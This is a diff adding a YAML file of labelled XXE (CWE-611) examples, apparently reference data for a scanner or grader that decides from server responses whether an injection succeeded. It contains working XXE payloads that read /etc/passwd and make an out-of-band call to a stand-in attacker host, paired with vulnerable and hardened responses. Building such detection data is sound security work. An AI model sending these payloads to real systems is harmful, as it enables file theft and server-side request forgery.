@@ -1,0 +1,26 @@
+# XML External Entity Injection (CWE-611) — OWASP A05:2021
+attack_type: xxe
+
+positive_examples:
+  - payload: "<!DOCTYPE r [<!ENTITY x SYSTEM 'file:///etc/passwd'>]><r>&x;</r>"
+    response_snippet: "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:..."
+    reasoning: >
+      The XML parser resolved the external entity and embedded /etc/passwd into
+      the response, proving external entity expansion is enabled — file disclosure.
+  - payload: "<!DOCTYPE r [<!ENTITY x SYSTEM 'http://oob-collab.example.com/xxe'>]><r>&x;</r>"
+    response_snippet: "out-of-band HTTP callback received from target's server"
+    reasoning: >
+      The parser fetched an attacker-controlled URL during entity resolution,
+      confirming blind XXE with SSRF reach even without file content in the response.
+
+negative_examples:
+  - payload: "<!DOCTYPE r [<!ENTITY x SYSTEM 'file:///etc/passwd'>]><r>&x;</r>"
+    response_snippet: '{"error":"DOCTYPE is disallowed","code":400}'
+    reasoning: >
+      The parser rejected the DOCTYPE declaration (external entities disabled),
+      so no entity was resolved — a hardened parser is not vulnerable.
+  - payload: "<!DOCTYPE r [<!ENTITY x SYSTEM 'file:///etc/passwd'>]><r>&x;</r>"
+    response_snippet: "the literal string &x; appears unresolved in the echoed XML"
+    reasoning: >
+      The entity reference was echoed unresolved, meaning external entity
+      expansion did not occur and no file was read.
